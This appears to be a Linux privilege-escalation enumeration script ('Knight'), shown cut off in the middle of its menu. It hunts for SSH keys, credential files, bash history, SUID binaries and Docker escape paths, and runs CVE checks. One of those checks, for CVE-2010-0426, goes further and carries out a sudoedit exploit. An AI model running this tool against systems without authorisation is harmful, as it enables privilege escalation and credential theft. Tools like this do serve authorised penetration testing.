#!/bin/bash

# Display Knight ASCII art
echo -e '
       !
      .-.
    __|=|__
   (_/`-`\_)
   //\___/\\
   <>/   \<>
    \|_._|/
     <_I_>
      |||
     /_|_\ 
'

# Define color variables
BPurple='\033[1;35m'
NC='\033[0m'
BBlue='\033[1;34m'
BGray='\033[1;30m'
BRed='\033[1;31m'
BGreen='\033[1;32m'
B="\033[1;34m"
LG="\033[1;37m" 
DG="\033[1;90m" 
NC="\033[0m"

printSection() {
    # Print a section like:
    # ========================================( Title here )========================================
    l=94
    if [ "$1" ]; then
        s="( $1 )"
    else
        s="$1"
    fi
    size=${#s}
    no=$((l-size))
    start=$((no/2))
    end=$((no-start))
    echo -e "${BBlue}$(printf '%*s' "$start" '' | tr ' ' '=')${BPurple}${s}${BBlue}$(printf '%*s' "$end" '' | tr ' ' '=')${NC}"
}

# Function to spawn a tty shell
function tty_shell() {
    # Check for available interpreters and spawn a shell
    if command -v python &> /dev/null; then
        python -c 'import pty; pty.spawn("/bin/bash")' && export TERM=xterm-256color
    elif command -v python3 &> /dev/null; then
        python3 -c 'import pty; pty.spawn("/bin/bash")' && export TERM=xterm-256color
    elif command -v perl &> /dev/null; then
        perl -e 'exec "/bin/sh";'
    else
        echo -e "\n[${BPurple}!${NC}] ${BRed}Python, Python3, and Perl not found.${NC} Please install at least one of these interpreters to use this feature.\n"
    fi
}

# Function to display Knight version
function show_version() {
    # Display Knight version
    echo -e "\nKnight-v(${BPurple}4.5.8${NC})\n"
}

# Function to display Knight help message
function show_help() {
    # Display Knight help message
    echo -e "\nKnight-v(${BPurple}4.5.8${NC})\n"
    echo -e "${BPurple}Usage:${NC}"
    echo -e "	./knight                 {Runs the script in ${BPurple}standard${NC} mode}"
    echo -e "	./knight ${BPurple}--version${NC} or ${BPurple}-v${NC} {Displays the Program ${BPurple}version${NC} and exits}"
    echo -e "	./knight ${BPurple}--help${NC}    or ${BPurple}-h${NC} {Displays this ${BPurple}help${NC} message and exit}\n"
}

# Function to check permissions on /etc/passwd and /etc/shadow
function passwd_shadow() {
    # Check permissions on /etc/passwd and /etc/shadow
    echo -e "\n${BPurple}[+]${NC} Do you see ${BBlue}Write/Read${NC} on ${BPurple}/etc/shadow${NC} ${BBlue}and${NC} ${BPurple}/etc/passwd${NC}"
    ls -lah /etc/passwd | grep 'r\|w' --color=auto
    ls -lah /etc/shadow | grep 'r\|w' --color=auto
    echo
}

# Function to display system information
function whoisthis() {
    # Display current user, hostname, user details, shell information, and system architecture
    echo -e "\n${BBlue}============================================================================${NC}"
    echo -e "\n${BBlue}current user:${NC} ${BPurple}$(whoami)${NC}"
    echo -e "\n${BBlue}Hostname:${NC} ${BPurple}$(hostname)${NC}"
    if [ ${UID} -eq 0 ]; then
        echo -e "\n${BPurple} You Are Already${NC} ${BPurple}root${NC} ${BBlue} Bozzy! Nani?!!${NC}\n"
    fi
    id | grep 'groups\|uid\|root' --color=auto
    echo -e "${BBlue}============================================================================${NC}"
    echo -e -e "\n${BBlue}Bash version:${NC} ${BPurple}$(/bin/bash --version)${NC}\n"
    echo -e "\n[${BPurple}+${NC}] ${BBlue}Shells${NC} ${BPurple}we have!${NC}"
    cat /etc/shells
    echo -e "${BBlue}============================================================================${NC}"
    echo -e "\n[${BPurple}+${NC}] ${BBlue}Users on System${NC} ${BPurple}with console!${NC}"
    cat /etc/passwd | grep '/bin/bash\|/bin/sh\|/bin/zsh'
    echo -e "${BBlue}============================================================================${NC}"
    echo -e "\n[${BPurple}+${NC}] ${BBlue}Distro!${NC} ${BPurple}Kernel exploits??${NC}"
    echo
    cat /etc/os-release
    echo
    cat /proc/version | grep 'Linux\|linux\|Rhel\|debian\|RHEL\|Cent\|ubuntu' --color=auto
    echo -e "${BBlue}============================================================================${NC}"
    echo -e "\n[${BPurple}+${NC}] ${BBlue}Do we Have${NC} ${BPurple}GCC/CC??${NC} or ${BBlue}Cross-compilation${NC}"
    /usr/bin/which gcc | grep gcc --color=auto
    /usr/bin/which cc | grep cc --color=auto

    echo -e "\n[${BPurple}+${NC}] ${BBlue}what${NC} ${BPurple}architecture${NC} is ${BBlue}$(hostname)${NC}\n"
    arch | grep '64\|x86\|i686\|86' --color=auto
    echo -e "${BBlue}============================================================================${NC}"

}

# Function to display capabilities of executables
function capabilities() {
    # Display capabilities of executables
    echo -e "\n[${BPurple}+${NC}] ${BBlue}Eye On${NC} ${BPurple}Capabilities${NC} ${BPurple}:: be paitent this can take time!${NC}"
    command=$(getcap -r / 2>/dev/null)
    echo ${command}
    echo
    echo ${command} | grep 'python\|python3\|perl'
}

# Function to display cron jobs
function cronjobs() {
    echo -e "\n[${BPurple}+${NC}] ${BBlue}Displaying system-wide CronJobs from${NC} ${BPurple}/etc/crontab${NC}\n"
    
    if [[ -r /etc/crontab ]]; then
        cat /etc/crontab
    else
        echo -e "[${BRed}!${NC}] ${BRed}Cannot read /etc/crontab. Check permissions.${NC}"
    fi
    
    echo -e "\n[${BPurple}+${NC}] ${BBlue}Checking directories in${NC} ${BPurple}/var/spool/cron${NC}\n"
    
    if [[ -d /var/spool/cron ]]; then
        ls -la /var/spool/cron
    else
        echo -e "[${BRed}!${NC}] ${BRed}/var/spool/cron not found.${NC}"
    fi

    if [[ -d /var/spool/cron/crontabs ]]; then
        echo -e "\n[${BPurple}+${NC}] ${BBlue}Listing contents of${NC} ${BPurple}/var/spool/cron/crontabs${NC}\n"
        
        # Verifica permessi di lettura
        if [[ -r /var/spool/cron/crontabs ]]; then
            ls -la /var/spool/cron/crontabs
        else
            echo -e "[${BRed}!${NC}] ${BRed}Permission denied for /var/spool/cron/crontabs.${NC}"
        fi
    else
        echo -e "[${BRed}!${NC}] ${BRed}/var/spool/cron/crontabs not found.${NC}"
    fi

    echo -e "\n[${BPurple}+${NC}] ${BBlue}Checking current user's CronJobs${NC}"
    crontab -l 2>/dev/null || echo -e "[${BRed}!${NC}] ${BRed}No crontab found for current user.${NC}"
}


# Function to display SSH keys
function keys_ssh() {
    # Search for SSH keys
    echo -e "\n[${BPurple}+${NC}] ${BBlue}Looking for ${BPurple}SSH keys?${NC}"
    
    # Define common directories for SSH keys
    common_dirs=("$HOME/.ssh" "/root/.ssh" "/etc/ssh")
    
    # Search for private keys in common directories
    ssh_keys=$(find "${common_dirs[@]}" -type f \( -name "id_rsa" -o -name "id_ecdsa" -o -name "id_ed25519" -o -name "*.pem" \) 2>/dev/null)
    
    # Check if any SSH keys were found
    if [[ -n "$ssh_keys" ]]; then
        echo -e "${BGreen}[+] Found SSH keys:${NC}\n$ssh_keys"
    else
        echo -e "\n${BRed}[-] No SSH keys found in common locations.${NC}"
    fi
    echo
}

# Function to check for Docker presence
function dker() {
    # Check for Docker presence
    echo -e "\n[${BPurple}+${NC}] ${BBlue}See ${BPurple}Docker${NC} in there?"
    id | grep 'groups\|gid\|uid\|docker' --color=auto
    echo
}

# Function to find and analyze SUID binaries using GTFObins techniques
check_gtfobins() {
    # Print Ascii Art
    echo -e "${BRed} _____ _____ _____ _____ _____ _         "${NC} 
    echo -e "${BRed}|   __|_   _|   __|     | __  |_|___ ___ "${NC}
    echo -e "${BRed}|  |  | | | |   __|  |  | __ -| |   |_ -|"${NC}
    echo -e "${BRed}|_____| |_| |__|  |_____|_____|_|_|_|___|"${NC}

    # Prompt the user to choose between scraping GTFOBins or searching for setuid binaries
    echo -e "\n${BGray}Choose an option:${NC}\n"
    echo -e "${BGray}1. Scrape GTFOBins for a specific binary${NC}"
    echo -e "${BGray}2. Search for setuid binaries on the system${NC}"
    printf "\n${BGray}Enter your choice (1 or 2): ${NC}"
    read option

    if [ "$option" == "1" ]; then
        # Ask the user for the binary name
        printf "\n${BPurple}Enter the binary name: ${NC}"
        read binary

        # Check if a binary name is provided and if it contains only alphanumeric characters, underscores, and hyphens
        if [ -z "$binary" ] || [[ ! "$binary" =~ ^[a-zA-Z0-9_-]+$ ]]; then
            echo -e "${BRed}Please provide a valid binary name with only alphanumeric characters, underscores, and hyphens.${NC}"
            return 1
        fi

        local url="https://gtfobins.github.io/gtfobins/$binary/"

        # Query gtfobins.github.io for the binary
        local response=$(curl -s "$url")

        # Extract the list of functions and display
        local functions=$(echo "$response" | pup 'h2.function-name text{}' | sed 's/^\s*//;s/\s*$//' | sed '/^$/d')  # Remove leading/trailing spaces and empty lines

        # Check if there are any functions available
        if [ -z "$functions" ]; then
            echo -e "${BRed}[x]'$binary' not found in gtfobins database.${NC}"
            return 1
        fi

        local i=1
        echo ""
        while IFS= read -r func; do
            echo -e "${BGray}$i. $func${NC}"
            ((i++))
        done <<< "$functions"

        # Prompt for function selection
        printf "\n${BPurple}Choose a function (enter the number): ${NC}"
        read choice

        # Validate the choice
        if ! [[ "$choice" =~ ^[0-9]+$ ]] || [ "$choice" -lt 1 ] || [ "$choice" -ge "$i" ]; then
            echo -e "${BRed}Invalid choice. Please enter a valid number.${NC}"
            return 1
        fi

        # Retrieve the exploit code for the chosen function
        local chosen_func=$(echo "$functions" | sed -n "${choice}p" | tr '[:upper:]' '[:lower:]' | sed 's/ /-/g')
        local exploit=$(echo "$response" | awk -v chosen_func="$chosen_func" '/<h2 id="'$chosen_func'"/,/<\/pre>/ {gsub(/<\/?[^>]+>/, ""); gsub(/&lt;/, "<"); gsub(/&gt;/, ">"); gsub(/&amp;/, "\\x26"); gsub(/&quot;/, "\""); gsub(/&#39;/, "\x27"); sub(/^[[:space:]]+/, ""); if ($0 ~ /\S/) print $0;}')

        # Check if exploit code is empty
        if [ -z "$exploit" ]; then
            echo -e "${BRed}No exploit code found.${NC}"
            return 1
        fi

        # Split the exploit content into description and code
        IFS=$'\n' read -d '' -r -a lines <<< "$exploit"
        description=""
        code=""
        start_code=0
        for line in "${lines[@]}"; do
            if [[ "$line" =~ ^(export|TF=|echo|nmap|local) ]] || [[ "$line" =~ ^[[:space:]]*[a-zA-Z0-9_]+= ]]; then
                if [[ $start_code -eq 0 ]]; then
                    echo -e "\nDescription:\n------------------------"
                    echo -e "${BGray}${description}${NC}"
                    description=""
                    echo -e "\nExploit Code:\n------------------------"
                fi
                echo -e "${BPurple}${line}${NC}"
                start_code=1
            else
                if [[ $start_code -eq 0 ]]; then
                    description+="$line\n"
                else
                    echo -e "${BGray}${line}${NC}"
                fi
            fi
        done

    elif [ "$option" == "2" ]; then
        # Search for setuid binaries on the system
        echo -e "\n${BGray}Searching for setuid binaries on the system...${NC}"
        # Print headers with fixed widths
        printf "\n${BPurple}%-12s %-5s %-8s %-8s %-10s %-14s %s${NC}\n" "Permissions" "Links" "Owner" "Group" "Size" "Date" "Path"
        # Process each line with fixed widths
        find / -perm -4000 -exec ls -ldb {} \; 2>/dev/null | awk '{ 
            printf "%-12s %-5s %-8s %-8s %-10s %-14s %s\n", 
            $1, $2, $3, $4, $5, $6 " " $7 " " $8, $9 
        }'
    else
        echo -e "${BRed}Invalid option. Please choose either 1 or 2.${NC}"
        return 1
    fi
}

# Function to display bash history
function bash_history() {
    # Display bash history
    echo -e "[${BPurple}+${NC}] ${BBlue}See something${NC} in ${BPurple}Bash History?${NC}"
    cd ~
    cat .bash_history
    echo
}

# Function to search for configuration files
function config_code() {
    # Search for configuration files
    echo -e "\n[${BPurple}+${NC}] ${BBlue}DB-creds?/compiled-code${NC} intersting ${BPurple}.php/.cap/.bak? :: be paitent this can take time!${NC}"
    find / -name *config*.php 2> /dev/null &
    find / -name *db*.php 2> /dev/null &
    find / -name *.bak 2> /dev/null &
    find / -name *.cap 2> /dev/null &
    find / -name *.pcap 2> /dev/null &
    wait
    echo -e "\n[${BPurple}+${NC}] ${BBlue}Configuration Files${NC} ${BPurple}writable by you!${NC}\n"
    find /etc -type f -writable 2> /dev/null
    echo
}

# Function to display network information
function hidden_service_and_network() {
    # Display network information
    echo -e "\n[${BPurple}+${NC}] ${BBlue}Duo-Homed${NC} ${BPurple}Some Dynamic tunneling?${NC}"
    /sbin/ifconfig
    if [ $? -ne 0 ]; then
        ip a
    fi
    echo
    ip route
    echo -e "\n[${BPurple}+${NC}] ${BBlue}Any Friends${NC} ${BPurple}Nearby?${NC}"
    arp -a
    echo -e "\n[${BPurple}+${NC}] ${BBlue}Need some${NC} ${BPurple}tunneling?${NC}"
    ss -antlp
    if [ $? -ne 0 ]; then
        netstat -ano
    fi
    echo -e "${BBlue}===============================================================================${NC}"
    echo
}

# Function to display sudo privileges
function Sudo() {
    # Display sudo privileges
    result=$(sudo -l)
    echo ${result} | grep 'ALL\|LD_PRELOAD\|env_keep\|root' --color=auto
}

# Function to clear the console
function console_clear() {
    # Clear the console
    export TERM=xterm-256color
    clear
}

# Function to display NFS shares
function nfs() {
    # Display NFS shares
    echo -e "\n[${BPurple}+${NC}] ${BBlue}Is there${NC} any ${BPurple}NFS?${NC}"
    cat /etc/exports
    echo
}

# Function to search for WordPress configuration files
function search_wordpress_config() {
    # Search for WordPress configuration files
    echo -e "\n[${BPurple}+${NC}] ${BBlue}Searching for your WordPress configuration file${NC}"
    find /var/www/html -name wp-config.php 2>/dev/null
    echo
}

# Function to search writeble directory
function check_writable_dirs() {
    echo -e "\n${BPurple}Scanning for writable directories...${NC}"
    writable_dirs=$(find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null)
    
    if [[ -n "$writable_dirs" ]]; then
        echo -e "\n${BPurple}Writable directories found:${NC}\n"
        echo "$writable_dirs"
    else
        echo -e "\n${BRed}No writable directories found.${NC}"
    fi
}

# Function to exit the program
function exit_program() {
    # Exit the program
    echo ""
    echo -e "\n[${BPurple}+${NC}] Exiting Knight-v(${BPurple}4.5.8${NC}) at $(date +%T)\n"
    exit 0
}

# Function to check for Logrotten vulnerability
function check_logrotten_vulnerability() {
    # Check for Logrotten vulnerability
    echo -e "\n[*]${BPurple} Check for Logrotten vulnerability${NC}..."

    compare_versions() {
        local version1=$1
        local version2=$2

        IFS='.' read -ra v1 <<< "$version1"
        IFS='.' read -ra v2 <<< "$version2"

        for i in "${!v1[@]}"; do
            if [[ "${v1[i]}" -lt "${v2[i]}" ]]; then
                echo -1
                return
            elif [[ "${v1[i]}" -gt "${v2[i]}" ]]; then
                echo 1
                return
            fi
        done

        echo 0
    }

    if command -v logrotate &> /dev/null; then
        logrotate_version=$(logrotate --version 2>&1 | awk '/logrotate/ {gsub(/state/, "", $2); print $2}')
        
        if [ -z "$logrotate_version" ]; then
            echo -e "${BBlue}Unable to determine logrotate version.${NC}"
            return
        fi

        vulnerable_versions=("3.8.6" "3.11.0" "3.15.0" "3.18.0")

        if [[ $(compare_versions "$logrotate_version" "${vulnerable_versions[0]}") -ge 0 &&
              $(compare_versions "$logrotate_version" "${vulnerable_versions[-1]}") -le 0 ]]; then
            echo -e "\nLogrotate version ${BPurple}$logrotate_version is potentially vulnerable${NC} to Logrotten Vulnerability."
        else
            echo -e "\nLogrotate version ${BPurple}$logrotate_version is not vulnerable${NC} to Logrotten Vulnerability."
        fi
    else
        echo -e "\n${BBlue}Logrotate is not installed on this system.${NC}"
    fi
}

# Function to check for Dirty Cow vulnerability
function check_dirty_cow_vulnerability() {
    # Check for Dirty Cow vulnerability
    echo -e "\nCheck ${BPurple}Dirty Pipe Vulnerability${NC} [ ${BBlue}CVE-2022-0847${NC} ]..."

    kernel=$1
    ver1=$(echo ${kernel:-$(uname -r | cut -d '-' -f1)} | cut -d '.' -f1)
    ver2=$(echo ${kernel:-$(uname -r | cut -d '-' -f1)} | cut -d '.' -f2)
    ver3=$(echo ${kernel:-$(uname -r | cut -d '-' -f1)} | cut -d '.' -f3)

    if (( ${ver1:-0} < 5 )) ||
       (( ${ver1:-0} > 5 )) ||
       (( ${ver1:-0} == 5 && ${ver2:-0} < 8 )) ||
       (( ${ver1:-0} == 5 && ${ver2:-0} == 10 && ${ver3:-0} == 102 )) ||
       (( ${ver1:-0} == 5 && ${ver2:-0} == 10 && ${ver3:-0} == 92 )) ||
       (( ${ver1:-0} == 5 && ${ver2:-0} == 15 && ${ver3:-0} == 25 )) ||
       (( ${ver1:-0} == 5 && ${ver2:-0} >= 16 && ${ver3:-0} >= 11 )) ||
       (( ${ver1:-0} == 5 && ${ver2:-0} > 16 ));
    then
        echo -e "\nKernel Version (${BPurple}$ver1.$ver2.$ver3${NC}) is not Vulnerable."
    else
        echo -e "\nKernel Version (${BPurple}$ver1.$ver2.$ver3${NC}) is Vulnerable." 
    fi
}

# Function to check for systemd CVE-2023-26604
function check_CVE_2023_26604() {
    # Check for systemd CVE-2023-26604
    echo -e "\nCheck systemd version for CVE-2023-26604..."

    local version=$(systemd --version | awk 'NR==1{print $2}')

    if [ "$version" \< "247" ]; then
        echo -e "\nSystemd ${BPurple}is Vulnerable${NC} to CVE-2023-26604 [ systemd version: $version ]"
    else
        echo -e "\nSystemd ${BPurple}is Not Vulnerable${NC} to ${BPurple}CVE-2023-26604${NC} [ systemd version: ${BPurple}$version${NC} ]"
    fi
}

# Function to check for Shellshock vulnerability
function check_shellshock() {
    # Check for Shellshock vulnerability
    bash_version=$(bash --version | grep -oE '[0-9]+\.[0-9]+' | head -n1)
    echo -e "\nBash Version: {${BBlue} $bash_version ${NC}}"
    if env x='() { :;}; echo vulnerable' bash -c "echo this is a test" 2>/dev/null | grep -q 'vulnerable'; then
        echo -e "\nThe system ${BPurple}is vulnerable${NC} to Shellshock."
    else
        echo -e "\nThe system ${BPurple}is not vulnerable${NC} to Shellshock."
    fi
}

# Function to check for CVE-2016-0728 vulnerability
function check_CVE_2016_0728() {
    # Check for CVE-2016-0728 vulnerability
    kernel_version=$(uname -r | awk -F. '{ printf("%d%03d%03d%03d\n", $1,$2,$3,$4); }')

    if [ "$kernel_version" -lt "004004001000" ]
    then
        echo -e "\nThe system may ${BPurple}be vulnerable${NC} to CVE-2016-0728."
    else
        echo -e "\nThe system ${BPurple}is not vulnerable${NC} to CVE-2016-0728."
    fi
}

# Function to check for CVE-2016-1531 vulnerability
function check_CVE_2016_1531() {
    # Check for CVE-2016-1531 vulnerability
    if ! command -v exim &> /dev/null; then
        echo -e "\n${BBlue}Exim is not installed on your machine.${NC}"
        return
    fi

    versione_exim=$(exim --version | head -n 1 | awk '{print $3}')
    versioni_vulnerabili=("4.84-3" "4.84")

    if [[ " ${versioni_vulnerabili[@]} " =~ " $versione_exim " ]]; then
        echo -e "\nThe machine ${BPurple}is vulnerable${NC} to CVE-2016-1531."
    else
        echo -e "\nThe machine ${BPurple}is not vulnerable${NC} to CVE-2016-1531."
    fi
}

# Function to check for CVE-2010-0426 vulnerability
function check_CVE_2010_0426() {
    # Check for CVE-2010-0426 vulnerability
    affected_versions='1.6,1.6.1,1.6.2,1.6.3p1,1.6.3p4,1.6.3p6,1.6.3p2,1.6.3p5,1.6.3p7,1.6.3p3,1.6.3,1.6.4p1,1.6.4p2,1.6.5p1,1.6.5p2,1.6.7p5,1.6.8p1,1.6.8p2,1.6.8p5,1.6.8p9,1.6.8p7,1.6.8p8,1.6.8p12,1.6.9p18,1.6.9p19,1.6.9p17,1.7.0,1.7.1,1.7.2p1,1.7.2p2,1.7.2p3,1.7.2'

    sudo_version=$(sudo -V | grep "Sudo version" | cut -d" " -f3)i
    sudo_version_match=$(echo "$affected_versions" | grep "$sudo_version")
    executable_file=$(sudo -l | grep sudoedit | cut -d":" -f 2 | awk -F " " '{print $2}')

    if [ -z "$sudo_version_match" ] && [ -z "$executable_file" ]; then
        echo -e "\n${BPurple}[${NC}-${BPurple}]${NC} Target is not vulnerable${NC}"
    else
        echo "\n${BPurple}[${NC}+${BPurple}]${NC} Target is vulnerable${NC}"
        echo "${BPurple}[${NC}+${BPurple}]${NC} Running stuff...${NC}"

        cat > /var/tmp/sudoedit << _EOF
        #!/bin/sh
        su
        /bin/su
        /usr/bin/su
_EOF

        chmod a+x /var/tmp/sudoedit
        sudo /var/tmp/sudoedit "$executable_file"
    fi
}

# Function to check for CVE-2023-22809 vulnerability
function check-2023-22809() {
    # Check sudo version
    sudo_version=$(sudo -V | grep "Sudo version" | awk '{print $3}')
    echo -e "\nVersion of sudo installed: ${BBlue}$sudo_version${NC}"

    if [[ "$sudo_version" == "1.9.10" || ("$sudo_version" > "1.9.10" && "$sudo_version" < "1.9.14p1") ]]; then
        echo -e "Your system ${BPurple}may be vulnerable${NC} to CVE-2023-22809."
    else
        echo -e "Your system ${BPurple}does not appear to be vulnerable${NC} to CVE-2023-22809."
    fi
}

# Trap Ctrl-Z and call the exit_program function
trap 'exit_program' SIGTSTP
# Trap Ctrl-C and call the exit_program function
trap 'exit_program' SIGINT

function docker-scan() {

    echo -e ""
    echo -e "${DG}                      ##${LG}         ."
    echo -e "${DG}                ## ## ##${LG}        =="
    echo -e "${DG}             ## ## ## ##${LG}       ==="
    echo -e "${LG}         /\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\___/ ==="
    echo -e "${B}    ~~~ ${DG}{${B}~~ ~~~~ ~~~ ~~~~ ~~~ ~${DG} /  ${LG}===-${B} ~~~${NC}"
    echo -e "${DG}         \\______ X           __/"
    echo -e "${DG}           \\    \\         __/"
    echo -e "${DG}            \\____\\_______/${NC}"
    echo -e ""

    printSection "Docker Info"
    # Performs scanning operations
    if [ -f /.dockerenv ]; then
        echo -e "${BGreen}[+] You are in a container!${NC}"
        
        USER=$(whoami)
        echo -e "${BGray}[.] User: ${USER}${NC}"
        
        OS=$(cat /etc/os-release 2>/dev/null | grep PRETTY | cut -d'"' -f2)
        if [ "$OS" = "" ]; then
            # for some other distros
            OS=$(cat /etc/issue | cut -d'\' -f1)
        fi
        echo -e "${BGray}[.] OS: ${OS}${NC}"
        
        # Determine container platform
        if [ -n "$KUBERNETES_SERVICE_HOST" ]; then
            echo -e "${BGray}[.] Container Platform: Kubernetes${NC}"
        else
            echo -e "${BGray}[.] Container Platform: Docker or other${NC}"
        fi
        
        CONTAINER_IP=$(hostname -i)
        echo -e "${BGray}[.] IP: ${CONTAINER_IP}${NC}"
        
        DNS_SERVER=$(cat /etc/resolv.conf | grep nameserver | cut -d' ' -f2)
        echo -e "${BGray}[.] DNS Server: ${DNS_SERVER}${NC}"
        
        # Print Container ID
        CONTAINER_ID="$(cat /etc/hostname || uname -n || hostname)"
        echo -e "${BGray}[.] Container ID: ${CONTAINER_ID}${NC}"
        
    else
        echo -e "${BRed}[!] You are not in a container!${NC}"
        return 1
    fi
    sleep 1
    
    # Heading to search for the Docker executable file
    printSection "Looking for docker executable"
    if [ $(which docker) ]; then
        echo -e "${BGreen}[+] docker executable exists at $(which docker) ${NC}"
        echo -e "${BGray}[.] You can try escaping by creating a container and mounting the host system ${NC}"

        # If it's not root
        if [ $(id -u) -ne 0 ]; then
            if id -nG "$(whoami)" | grep -qw "docker"; then
                echo -e "${BGreen}[+] You are part of the docker group${NC}"
            else
                echo -e "${BRed}[!] You are not part of the docker group.${NC}"
                echo -e "${BGray}[.] Try running sudo -l or escalate privileges to run docker.${NC}"
            fi
        fi
    else
        echo -e "${BRed}[!] No docker executable found${NC}"
    fi
    sleep 1


    # Heading to search for Docker API ports
    printSection "Looking for docker api ports"
    PORTS="2375 2376"
    FOUND=0
    for PORT in $PORTS; do
        if nc -zv localhost $PORT 1>/dev/null 2>/dev/null; then
            echo -e "${BGreen}[+] Port ${PORT} open. might be a docker api port"${NC}
            FOUND=1
        fi
    done
    if ! [ $FOUND -eq 1 ]; then
        echo -e "${BRed}[!] Port 2375 and 2376 are closed${NC}"
        echo -e "${BGray}[.] The api might be exposed on other ports.${NC}"
    fi
    sleep 1

    # Heading to look for vulnerable capabilities
    printSection "Looking for exploitable capabilities"
    if [ $(which capsh) ]; then
        CAPABILITIES="CAP_SYS_ADMIN CAP_SYS_PTRACE CAP_SYS_MODULE DAC_READ_SEARCH DAC_OVERRIDE CAP_SYS_RAWIO"
        for CAP in $CAPABILITIES; do
            if capsh --print | grep -i $CAP 1>/dev/null 2>/dev/null; then
                echo -e "${BGreen}[+] ${CAP} capability is set${NC}"

                # TODO: more hints on capabilities
                if [ $CAP = "CAP_SYS_ADMIN" ]; then
                    echo -e "${BGreen}[+] Check filesystem for mountable host drives by running fdisk -l${NC}"
                fi
            fi
        done
    else
        echo -e "${BRed}[!] capsh not installed${NC}"
    fi
    sleep 1

    # Heading to check for CVE vulnerabilities
    printSection "Checking CVEs"
    
    # CVE-2020-15257 Check
    echo -e "${BGray}[.] Checking CVE-2020-15257${NC}"
    if cat /proc/net/unix | grep 'containerd-shim' | grep '@'; then
        echo -e "${BGreen}[+] Container appears to be vulnerable to CVE-2020-15257!${NC}"
    else
        echo -e "${BGray}[.] Container does not appear to be vulnerable to CVE-2020-15257${NC}"
    fi
    
    # CVE-2019-5736 check
    echo -e "${BGray}[.] Checking CVE-2019-5736${NC}"
    if pgrep -f "runc" > /dev/null; then
        echo -e "${BGreen}[+] The runc process is running in the container.${NC}"
        
        # Verifica se è possibile sovrascrivere il binario runc
        if [ -w /proc/self/exe ]; then
            echo -e "${BGreen}[+] The runc binary can be overridden. Container appears to be vulnerable to CVE-2019-5736.${NC}"
        else
            echo -e "${BRed}[!] The runc binary cannot be overridden. Container does not appear to be vulnerable to CVE-2019-5736.${NC}"
        fi
    else
        echo -e "${BGray}[.] The runc process is not running in the container. The container may not be vulnerable to CVE-2019-5736.${NC}"
    fi


    # Performing Ping Sweep to find other containers in the network
    printSection "Performing Ping Sweep"
    SUBNET=$(echo $CONTAINER_IP | cut -d. -f1-3)
    echo -e "${BGray}[.] No other hosts found in the subnet${NC}"
    for ip in {1..254}; do
        if ping -c 1 -W 1 $SUBNET.$ip 1>/dev/null 2>&1; then
            echo -e "${BGreen}[+] Host $SUBNET.$ip is reachable${NC}"
        fi
    done

    # Port scanning
    case "$OS" in
    # Install nmap
        "Ubuntu" | "Ubuntu 22.04.4 LTS" | "Ubuntu 18.04.4 LTS")
            apt-get update > /dev/null 2>&1 && apt-get install -y nmap > /dev/null 2>&1
            ;;
        "Debian" | "Debian GNU/Linux 10 (buster)")
            apt-get update > /dev/null 2>&1 && apt-get install -y nmap > /dev/null 2>&1
            ;;
        "CentOS" | "Red Hat Enterprise Linux")
            yum install -y nmap > /dev/null 2>&1
            ;;
        "Alpine Linux")
            apk add --no-cache nmap > /dev/null 2>&1
            ;;
        "Arch Linux")
            pacman -Syu --noconfirm nmap > /dev/null 2>&1
            ;;
        *)
            echo -e "${BRed}[!] Unsupported OS${NC}"
            ;;
    esac

    if [ $(which nmap) ]; then
        printSection "Nmap Scanning"
        echo -e "${BGray}[.] Running nmap port scan${NC}"
        nmap $CONTAINER_IP -p- 
        sleep 3
        # Remove nmap
        echo -e "${BGray}[.] Removing nmap${NC}"
        case "$OS" in
            "Ubuntu" | "Ubuntu 22.04.4 LTS" | "Ubuntu 18.04.4 LTS")
                apt remove -y nmap > /dev/null 2>&1
                ;;
            "Debian" | "Debian GNU/Linux 10 (buster)")
                apt-get remove -y nmap > /dev/null 2>&1
                ;;
            "CentOS" | "Red Hat Enterprise Linux")
                yum remove -y nmap > /dev/null 2>&1
                ;;
            "Alpine Linux")
                apk del nmap > /dev/null 2>&1
                ;;
            "Arch Linux")
                pacman -R --noconfirm nmap > /dev/null 2>&1
                ;;
            *)
                echo -e "${BRed}[!] Unsupported OS${NC}"
                ;;
        esac
    else
        echo -e "${BRed}[!] Failed to install nmap${NC}"
    fi

    printSection "Mounted Volumes"
    if [ -d "/proc/1/root" ]; then
        echo -e "${BGray}[.] Listing mounted volumes:${NC}"
        if mount | grep -q "/proc/1/root"; then
            mount | grep "/proc/1/root" | while read -r line; do
                echo -e "${BGray}[.] $line${NC}"
            done
        else
            echo -e "${BGray}[.] No volumes mounted.${NC}"
        fi
    else
        echo -e "${BRed}[!] Unable to access container's filesystem.${NC}"
    fi

    printSection "Looking for exposed Docker socket"
    if [ -S "/var/run/docker.sock" ]; then
        echo -e "${BGreen}[+] Docker socket found at /var/run/docker.sock${NC}"
    else
        echo -e "${BRed}[!] No exposed Docker socket found${NC}"
    fi

    printSection "Searching for Docker Sock Files"
    echo -e "${BGray}[.] Searching for docker sock files${NC}"
    if [ $(find / -name docker.sock 2>/dev/null | wc -l) -eq 0 ]; then
        echo -e "${BGray}[.] No docker sock files found.${NC}"
    else
        find / -name docker.sock 2>/dev/null
    fi

    printSection "Searching for Configuration Files"
    for file in $CONFIG_FILES; do
        if [ -f "$file" ]; then
            echo -e "${BGreen}[+] Configuration file found: $file${NC}"
            # You can add additional actions here if needed
        else
            echo -e "${BGray}[.] Configuration file not found. $file${NC}"
        fi
    done

    printSection "Searching for Other Potential Users"
    if [ -f "/etc/passwd" ]; then
        echo -e "${BGray}[.] Examining /etc/passwd file${NC}"
        while IFS=: read -r username _ uid _ _ home shell; do
            if [ "$uid" -ge 1000 ]; then
                echo -e "${BGreen}[+] Potential user found: $username${NC}"
                echo -e "${BGray}   - UID: $uid${NC}"
                echo -e "${BGray}   - Home directory: $home${NC}"
                echo -e "${BGray}   - Default shell: $shell${NC}"
            fi
        done < "/etc/passwd"
    else
        echo -e "${BRed}[!] /etc/passwd file not found.${NC}"
    fi
}

# Main function
function main() {
    # Select options in a loop
    PS3=$(echo -e "\n(${BPurple}knight${NC}@$(uname -a | awk '{print $2}'))-[${BPurple}$(pwd | sed "s|^$HOME|~|")${NC}]~# \n")
    while true; do
        echo -e "[${BPurple}+${NC}] Choose the option ${BRed}number${NC} from the menu below! \n"
        select answer in \
        "Sudo" \
        "tty_shell" \
        "passwd_shadow" \
        "whoisthis" \
        "capabilities" \
        "cronjobs" \
        "keys_ssh" \
        "docker" \
        "bash_history" \
        "config_code" \
        "hidden_service_and_network" \
        "NFS_shares" \
        "search_wordpress_config" \
        "console_clear" \
        "docker-scan" \
        "check_writable_dirs" \
        "check_gtfobins" \
        "check_logrotten" \
        "check_dirty_cow" \
